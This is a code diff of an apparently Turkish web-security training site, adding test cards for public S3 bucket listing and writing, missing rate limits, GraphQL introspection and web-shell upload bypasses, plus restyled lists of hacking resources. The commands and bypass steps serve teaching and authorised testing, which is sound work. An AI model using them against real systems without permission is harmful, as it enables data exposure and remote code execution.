+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sitenin kaynak kodunda <code>s3.amazonaws.com</code> veya <code>blob.core.windows.net</code> gibi URL'ler arayın. Bulunan kova adını (örn: <code>sirket-assets.s3.amazonaws.com</code>) doğrudan tarayıcıda açmayı deneyin. AWS CLI kullanarak aşağıdaki komutla listelemeyi deneyin:</p>
+        <pre style='margin-bottom: 20px;'>aws s3 ls s3://sirket-assets --no-sign-request</pre>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Kovanın içindeki tüm dosyaların listelenmesi (Public List) veya daha kötüsü, aşağıdaki komutla yazılabilmesi (Public Write):</p>
+        <pre style='margin-bottom: 10px;'>aws s3 cp test.txt s3://sirket-assets --no-sign-request</pre>
+        <p class='small' style='margin-top: 5px;'>Bu, RCE'ye eşdeğer olabilir.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 15: Hız Limiti (Rate Limit) Misconfiguration</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>API endpoint'lerinde (özellikle <code>/login</code>, <code>/reset-password</code>) hız limiti (rate limit) uygulanıp uygulanmadığını kontrol etmek. Eksik limit, kaba kuvvet (brute-force) saldırılarına kapı açar.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 20px 0;'><strong>Burp Intruder</strong> ile <code>/login</code> isteğini ardı ardına 100 kez (veya daha fazla) gönderin. Parola alanında bir payload listesi kullanın.</p>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucunun <code>429 Too Many Requests</code> gibi bir hata dönmek yerine tüm isteklere <code>200 OK</code> veya <code>403 Forbidden</code> (yanlış parola) ile cevap vermeye devam etmesi. Bu, kaba kuvvet saldırılarına izin verir.</p>
+      </div>
+    </details>
+  </li>
+  
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 16: GraphQL Introspection Sorgusu</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>GraphQL API'sinin, veritabanı şemasının tamamını ifşa eden "Introspection Query" (iç gözlem sorgusu) çalıştırmasına izin verip vermediğini test etmek.</p>
+
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Eğer site <code>/graphql</code> endpoint'i kullanıyorsa, aşağıdaki gibi bir "Introspection Query" gönderin:</p>
+        <pre style='margin-bottom: 20px;'>{ "__schema": { "types": {} } }</pre>
+        
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucunun, tüm veritabanı şemasını, tabloları ve alanları (types, fields) JSON olarak geri döndürmesi. Bu, saldırgan için önemli bir keşif aracıdır.</p>
+      </div>
+    </details>
+  </li>
+
+  <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
+    <details>
+      <summary style='cursor:pointer;font-weight:bold;'>Test 17: Güvensiz Dosya Yükleme (Insecure File Upload) Yapılandırması</summary>
+      <div style='margin-top:10px;'>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🎯 Amaç:</strong>
+        <p class='small' style='margin:0 0 20px 0;'>Dosya yükleme (örn: profil resmi) fonksiyonunun, sadece Content-Type başlığına (örn: <code>image/jpeg</code>) güvenip güvenmediğini veya <code>.php</code>, <code>.aspx</code> gibi tehlikeli uzantıları engellemeyi unutup unutmadığını test etmek.</p>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-bottom:2px;'>🕵️ Test (PoC):</strong>
+        <ol class='small' style='padding-left:20px;margin:5px 0; margin-bottom: 20px;'>
+          <li><code>shell.php</code> adında bir dosya yüklemeyi deneyin.</li>
+          <li>Engellenirse, <code>shell.php.jpg</code> (çift uzantı) deneyin.</li>
+          <li>Engellenirse, <strong>Burp Repeater</strong>'da <code>shell.jpg</code> dosyasını yüklerken <code>Content-Type: image/jpeg</code> başlığını <code>Content-Type: application/x-php</code> olarak değiştirin VE dosya adını <code>shell.php</code> yapın.</li>
+        </ol>
+        <strong style='color:var(--accent);font-size:13px;display:block;margin-top:10px;margin-bottom:2px;'>💥 Zafiyetli Cevap:</strong>
+        <p class='small' style='margin:0 0 5px 0;'>Sunucunun, uzantı yerine sadece Content-Type'ı kontrol etmesi (veya hiç etmemesi) ve web shell'i sunucuya yüklemenize izin vermesi. Bu, doğrudan RCE (Uzaktan Kod Çalıştırma) sağlar.</p>
+      </div>
+    </details>
+  </li>
+
+</ul>
+`
+    }
+  ]
 },
 
 sensitive_data_exposure: {
@@ -2379,47 +2756,47 @@ toolbox: {
         title: 'Eğitim Platformları',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://portswigger.net/web-security" target="_blank" style="color:#34d399;text-decoration:none">PortSwigger Web Security Academy</a>: Ücretsiz, interaktif lab'lar ve web güvenliği dersleri.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://tryhackme.com" target="_blank" style="color:#34d399;text-decoration:none">TryHackMe</a>: Pratik yapabileceğiniz siber güvenlik odaklı lab'lar ve odalar.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://hackthebox.com" target="_blank" style="color:#34d399;text-decoration:none">Hack The Box</a>: Web ve sistem güvenliği için ileri seviye lab'lar.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://www.websec.nl" target="_blank" style="color:#34d399;text-decoration:none">WebSec.nl</a>: XSS ve diğer web zafiyetleri için interaktif lab'lar.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://vulnhub.com" target="_blank" style="color:#34d399;text-decoration:none">VulnHub</a>: İndirilebilir vulnerable makineler için pratik lab'lar.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://pentesterlab.com" target="_blank" style="color:#34d399;text-decoration:none">PentesterLab</a>: Web ve sistem zafiyetleri için ücretli/ücretsiz lab'lar.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://ctftime.org" target="_blank" style="color:#34d399;text-decoration:none">CTFtime</a>: Capture The Flag yarışmaları ve etkinlikleri için kaynak.
             </li>
           </ul>
         `
       },
-      {
+{
         title: 'Tarayıcı Eklentileri (Browser Extensions)',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg" target="_blank" style="color:#34d399;text-decoration:none">Wappalyzer</a>: Bir web sitesinde kullanılan teknolojileri (framework, CMS, kütüphane vb.) tespit eder.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://chromewebstore.google.com/detail/link-gopher/bpjdkodgnbfalgghnbeggfbfjpcfamkf?hl=en" target="_blank" style="color:#34d399;text-decoration:none">Link Gopher</a>: Bir sayfadaki tüm linkleri ve endpointleri çıkararak keşif sürecini hızlandırır.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://chromewebstore.google.com/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom/related" target="_blank" style="color:#34d399;text-decoration:none">Retire.js</a>: Sitede kullanılan ve bilinen zafiyetleri olan JavaScript kütüphanelerini tespit eder.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap" target="_blank" style="color:#34d399;text-decoration:none">Shodan</a>: Ziyaret edilen sitenin IP'si hakkında açık portlar, servisler ve potansiyel zafiyetler hakkında hızlı bilgi verir.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://chrome.google.com/webstore/detail/open-multiple-urls/oifijhaokejakekmnjmphonojcfkpbbh" target="_blank" style="color:#34d399;text-decoration:none">Open Multiple URLs</a>: Keşif sonrası bulunan subdomain veya URL listesini tek tıkla birden çok sekmede açar.
             </li>
           </ul>
@@ -2429,34 +2806,34 @@ toolbox: {
         title: 'Araçlar ve Komutlar',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://portswigger.net/burp/communitydownload" target="_blank" style="color:#34d399;text-decoration:none">Burp Suite Community</a>: Web proxy ve zafiyet tarama aracı.
             </li>          
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://highon.coffee/blog/nmap-cheat-sheet/" target="_blank" style="color:#34d399;text-decoration:none">Nmap Cheat Sheet</a>: Port tarama aracı.<br>
               <div style="display:flex;align-items:center;gap:8px">
               </div>
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://crackstation.net" target="_blank" style="color:#34d399;text-decoration:none">CrackStation</a>: Hash kırma aracı (MD5, SHA1 vb. için online sözlük tabanlı).<br>
               <a href="https://hashes.com" target="_blank" style="color:#34d399;text-decoration:none">Hashes.com</a> - <a href="https://github.com/hashcat/hashcat" target="_blank" style="color:#34d399;text-decoration:none">Hashcat</a> - <a href="https://github.com/openwall/john" target="_blank" style="color:#34d399;text-decoration:none">John the Ripper</a>
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://www.zaproxy.org" target="_blank" style="color:#34d399;text-decoration:none">OWASP ZAP</a>: Ücretsiz web uygulama güvenlik tarayıcısı.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/projectdiscovery/nuclei" target="_blank" style="color:#34d399;text-decoration:none">Nuclei</a>: Özelleştirilebilir zafiyet tarama şablonları.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/danielmiessler/SecLists" target="_blank" style="color:#34d399;text-decoration:none">SecLists</a>: Wordlist, payload ve pattern koleksiyonu (fuzzing için).
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://www.exploit-db.com" target="_blank" style="color:#34d399;text-decoration:none">Exploit Database</a>: Kamuya açık exploit ve shellcode arşivi.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://pentest-tools.com" target="_blank" style="color:#34d399;text-decoration:none">Pentest-Tools</a>: Online tarama araçları (subdomain, SQLi tarayıcı vb.).
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" style="color:#34d399;text-decoration:none">SQLMap</a>: Otomatik SQL injection aracı.<br>
               <div style="display:flex;align-items:center;gap:8px">
               </div>
@@ -2468,28 +2845,28 @@ toolbox: {
         title: 'Payload Koleksiyonları',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" style="color:#34d399;text-decoration:none">PayloadsAllTheThings</a>: XSS, SQLi, LFI vb. için kapsamlı payload listeleri.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/payloadbox/xss-payload-list" target="_blank" style="color:#34d399;text-decoration:none">XSS Payload List</a>: Çeşitli XSS payload koleksiyonu.<br>
               <a href="https://github.com/s0md3v/XSStrike" target="_blank" style="color:#34d399;text-decoration:none">XSStrike</a>: XSS tarayıcı ve payload jeneratörü.<br>
               <div style="display:flex;align-items:center;gap:8px">
               </div>
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank" style="color:#34d399;text-decoration:none">SQL Injection Payload List</a>: Farklı veritabanları için SQLi payloadları.<br>
               <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" style="color:#34d399;text-decoration:none">PortSwigger SQLi Cheat Sheet</a>: SQLi teknikleri ve payloadlar.<br>
               <div style="display:flex;align-items:center;gap:8px">
               </div>
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/TakSec/google-dorks-bug-bounty" target="_blank" style="color:#34d399;text-decoration:none">Google Dorks for Bug Bounty</a>: Bug bounty odaklı dork listesi.<br>
               <a href="https://www.exploit-db.com/google-hacking-database" target="_blank" style="color:#34d399;text-decoration:none">GHDB (Google Hacking Database)</a>: Kategorize edilmiş dork koleksiyonu.<br>
               <div style="display:flex;align-items:center;gap:8px">
               </div>
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing" target="_blank" style="color:#34d399;text-decoration:none">SecLists Fuzzing Payloads</a>: Fuzzing için genel payload listeleri (LFI, RFI, XXE vb.).
             </li>
           </ul>
@@ -2499,22 +2876,22 @@ toolbox: {
         title: 'Bug Bounty Platformları',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://hackerone.com" target="_blank" style="color:#34d399;text-decoration:none">HackerOne</a>: Büyük şirketlerin bug bounty programları ve hacktivity raporları.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://bugcrowd.com" target="_blank" style="color:#34d399;text-decoration:none">Bugcrowd</a>: Çeşitli seviyelerde programlar ve öğrenme kaynakları.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://www.intigriti.com" target="_blank" style="color:#34d399;text-decoration:none">Intigriti</a>: Avrupa merkezli bug bounty platformu, kaliteli programlar.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://yeswehack.com" target="_blank" style="color:#34d399;text-decoration:none">YesWeHack</a>: Uluslararası bug bounty programları ve eğitim içeriği.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://huntr.dev" target="_blank" style="color:#34d399;text-decoration:none">Huntr</a>: Açık kaynak projeleri için bug bounty platformu.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://openbugbounty.org" target="_blank" style="color:#34d399;text-decoration:none">Open Bug Bounty</a>: Ücretsiz, koordineli zafiyet açıklama platformu.
             </li>
           </ul>
@@ -2524,16 +2901,16 @@ toolbox: {
         title: 'Video ve YouTube Kaynakları',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://www.youtube.com/@mdisec" target="_blank" style="color:#34d399;text-decoration:none">Mehmet İnce</a>: Siber güvenlik eğitimleri, pratik exploit walkthrough'ları ve bug bounty ipuçları.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://www.youtube.com/c/Nahamsec" target="_blank" style="color:#34d399;text-decoration:none">NahamSec</a>: Bug bounty live stream'leri ve ipuçları.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://www.youtube.com/c/HackerOneTV" target="_blank" style="color:#34d399;text-decoration:none">HackerOne TV</a>: Resmi HackerOne videoları ve etkinlikler.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://www.youtube.com/c/STOKfredrik" target="_blank" style="color:#34d399;text-decoration:none">STÖK</a>: İleri seviye web hacking ve bug bounty videoları.
             </li>
           </ul>
@@ -2544,16 +2921,16 @@ toolbox: {
         title: 'Topluluklar ve Forumlar',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://reddit.com/r/bugbounty" target="_blank" style="color:#34d399;text-decoration:none">Reddit r/bugbounty</a>: Bug bounty tartışmaları, raporlar ve ipuçları.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://reddit.com/r/netsec" target="_blank" style="color:#34d399;text-decoration:none">Reddit r/netsec</a>: Siber güvenlik tartışmaları ve güncel içerikler.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:1g 0px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://x.com" target="_blank" style="color:#34d399;text-decoration:none">X Platformu</a>: Bug bounty avcılarının paylaşımlarını takip etmek için (#bugbounty hashtag).
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://forum.bugcrowd.com" target="_blank" style="color:#34d399;text-decoration:none">Bugcrowd Forum</a>: Araştırmacı topluluğu ve destek forumu.
             </li>
           </ul>
@@ -2563,22 +2940,22 @@ toolbox: {
         title: 'Referanslar ve Araçlar',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://owasp.org/www-project-top-ten/" target="_blank" style="color:#34d399;text-decoration:none">OWASP Top 10</a>: En kritik web güvenlik riskleri için rehber.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/EdOverflow/bugbounty-cheatsheet" target="_blank" style="color:#34d399;text-decoration:none">Bug Bounty Cheat Sheet</a>: Hızlı referans cheat sheet'ler.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://cheatsheetseries.owasp.org" target="_blank" style="color:#34d399;text-decoration:none">OWASP Cheat Sheets</a>: Hızlı referans için zafiyet ve güvenlik rehberleri.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://github.com/projectdiscovery" target="_blank" style="color:#34d399;text-decoration:none">ProjectDiscovery</a>: Subfinder, Nuclei gibi güçlü açık kaynak araçlar.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://cwe.mitre.org" target="_blank" style="color:#34d399;text-decoration:none">MITRE CWE</a>: Zayıflık türleri kataloğu.
             </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">
               <a href="https://cve.mitre.org" target="_blank" style="color:#34d399;text-decoration:none">MITRE CVE</a>: Bilinen zafiyet veritabanı.
             </li>
           </ul>
@@ -2588,12 +2965,12 @@ toolbox: {
         title: 'Hızlı Notlar',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">Başlangıç için: PortSwigger Academy ve TryHackMe ile ücretsiz lab'lara başlayın.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">Pratik: HackerOne Hacktivity'deki raporları okuyarak gerçek dünya örneklerini öğrenin.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">Topluluk: X ve Discord'da bug bounty topluluklarına katılın, güncel teknikleri takip edin.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">Etik: Her zaman program kapsamına uygun hareket edin, izinsiz test yapmayın.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">Güncel Kalın: OWASP ve CVE veritabanlarını düzenli takip edin, yeni araçları deneyin.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">Otomasyon: Araçları script'lerle birleştirerek recon sürecini otomatikleştirin.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">Başlangıç için: PortSwigger Academy ve TryHackMe ile ücretsiz lab'lara başlayın.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">Pratik: HackerOne Hacktivity'deki raporları okuyarak gerçek dünya örneklerini öğrenin.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">Topluluk: X ve Discord'da bug bounty topluluklarına katılın, güncel teknikleri takip edin.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">Etik: Her zaman program kapsamına uygun hareket edin, izinsiz test yapmayın.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">Güncel Kalın: OWASP ve CVE veritabanlarını düzenli takip edin, yeni araçları deneyin.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#adb5bd;font-size:14px">Otomasyon: Araçları script'lerle birleştirerek recon sürecini otomatikleştirin.</li>
           </ul>
         `
       }
